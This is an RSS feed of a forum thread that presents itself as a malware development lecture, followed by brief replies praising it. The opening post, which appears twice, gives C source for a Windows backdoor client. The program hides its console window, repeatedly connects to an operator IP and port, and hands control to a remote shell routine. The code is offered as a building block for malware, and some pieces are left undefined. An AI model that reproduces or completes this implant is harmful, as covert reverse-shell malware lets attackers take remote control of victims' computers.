<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware development lecture 1B</title>
    <link>https://0x00sec.org/t/malware-development-lecture-1b/38795</link>
    <description>This is lecture 1B of our malware development series
https://youtu.be/_ECGY6Fu_9s?si=DBk0D-pLE3dUecJh

check out the video to understand more
//header files

#include &lt;stdio.h&gt;     //standard input/output
#include &lt;stdlib.h&gt;    //standard utilities library
#include &lt;unistd.h&gt;    //access to the POSIX operating system API
#include &lt;winsock2.h&gt;  //windows sockets
#include &lt;windows.h&gt;   //declarations for all functions in Windows API
#include &lt;winuser.h&gt;   //windows controls
#include &lt;wininet.h&gt;   //windows internet interfaces
#include &lt;windowsx.h&gt;  //windows programming interfaces
#include &lt;string.h&gt;    //manupulate strings (char arrays)
#include &lt;sys/stat.h&gt;  //stat() function prototypes
#include &lt;sys/types.h&gt; //other function prototypes

//FUNCTION DEFINITION

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	//create new window handle
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA(&quot;ConsoleWindowClass&quot;, NULL); //window name = NULL
	ShowWindow(stealth, 0); //nCmdShow = 0 hides window

	//create socket object
	struct sockaddr_in ServAddr;
	WSADATA wsaData; //contain winsock.dll info

	//check winsock.dll status
	if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0)
	{
		exit(1);
	}

	//define socket object
	sock = socket(AF_INET, SOCK_STREAM, 0); //establish tcp connection
	//set host IP Address and Port [EDIT HERE]
	char *ServIP = &quot;192.168.56.1&quot;;
	unsigned short ServPort = 50000;
	memset(&amp;ServAddr, 0, sizeof(ServAddr)); //flush ServAddr with 0

	//set ServAddr parameters
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //covert string to IPv4 format
	ServAddr.sin_port = htons(ServPort); //convert to network byte order


	//wait for server connection to establish
	start :
	while (connect(sock, (struct sockaddr *) &amp;ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}

	Shell();
}</description>
    
    <lastBuildDate>Fri, 26 Jan 2024 05:15:58 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/8</link>
        <pubDate>Fri, 17 May 2024 23:42:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-8</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>Thanks alot please, i will be glad</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/7</link>
        <pubDate>Fri, 26 Jan 2024 05:15:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-7</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[ShikataGaNai]]></dc:creator>
        <description><![CDATA[
            <p>Nice very helpful, I subscribe to your channel</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/6</link>
        <pubDate>Fri, 26 Jan 2024 04:29:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-6</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>Hahaha cool man am trying to make this workout</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/5</link>
        <pubDate>Mon, 22 Jan 2024 15:37:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-5</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[d8rh8r]]></dc:creator>
        <description><![CDATA[
            <p>Solid follow up… Nice moves…  <img src="https://0x00sec.org/images/emoji/twitter/100.png?v=12" title=":100:" class="emoji" alt=":100:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/4</link>
        <pubDate>Sat, 20 Jan 2024 13:53:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-4</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>nice bro, we are trying to make it workout</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/3</link>
        <pubDate>Thu, 18 Jan 2024 00:36:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-3</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[cicada]]></dc:creator>
        <description><![CDATA[
            <p>My dude coming again with the high quality hotness</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/2</link>
        <pubDate>Wed, 17 Jan 2024 23:56:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-2</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
      <item>
        <title>Malware development lecture 1B</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>This is lecture 1B of our malware development series</p><p><a href="https://www.youtube.com/watch?v=_ECGY6Fu_9s">Malware development lecture 1B</a></p>

<p>check out the video to understand more<br>
//header files</p>
<p><span class="hashtag-raw">#include</span> &lt;stdio.h&gt;     //standard input/output<br>
<span class="hashtag-raw">#include</span> &lt;stdlib.h&gt;    //standard utilities library<br>
<span class="hashtag-raw">#include</span> &lt;unistd.h&gt;    //access to the POSIX operating system API<br>
<span class="hashtag-raw">#include</span> &lt;winsock2.h&gt;  //windows sockets<br>
<span class="hashtag-raw">#include</span> &lt;windows.h&gt;   //declarations for all functions in Windows API<br>
<span class="hashtag-raw">#include</span> &lt;winuser.h&gt;   //windows controls<br>
<span class="hashtag-raw">#include</span> &lt;wininet.h&gt;   //windows internet interfaces<br>
<span class="hashtag-raw">#include</span> &lt;windowsx.h&gt;  //windows programming interfaces<br>
<span class="hashtag-raw">#include</span> &lt;string.h&gt;    //manupulate strings (char arrays)<br>
<span class="hashtag-raw">#include</span> &lt;sys/stat.h&gt;  //stat() function prototypes<br>
<span class="hashtag-raw">#include</span> &lt;sys/types.h&gt; //other function prototypes</p>
<p>//FUNCTION DEFINITION</p>
<p>int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)<br>
{<br>
//create new window handle<br>
HWND stealth;<br>
AllocConsole();<br>
stealth = FindWindowA(“ConsoleWindowClass”, NULL); //window name = NULL<br>
ShowWindow(stealth, 0); //nCmdShow = 0 hides window</p>
<pre><code>//create socket object
struct sockaddr_in ServAddr;
WSADATA wsaData; //contain winsock.dll info

//check winsock.dll status
if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0)
{
	exit(1);
}

//define socket object
sock = socket(AF_INET, SOCK_STREAM, 0); //establish tcp connection
//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.56.1";
unsigned short ServPort = 50000;
memset(&amp;ServAddr, 0, sizeof(ServAddr)); //flush ServAddr with 0

//set ServAddr parameters
ServAddr.sin_family = AF_INET;
ServAddr.sin_addr.s_addr = inet_addr(ServIP); //covert string to IPv4 format
ServAddr.sin_port = htons(ServPort); //convert to network byte order


//wait for server connection to establish
start :
while (connect(sock, (struct sockaddr *) &amp;ServAddr, sizeof(ServAddr)) != 0)
{
	Sleep(10);
	goto start;
}

Shell();
</code></pre>
<p>}</p>
          <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-lecture-1b/38795/1</link>
        <pubDate>Wed, 17 Jan 2024 07:42:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38795-1</guid>
        <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
      </item>
  </channel>
</rss>
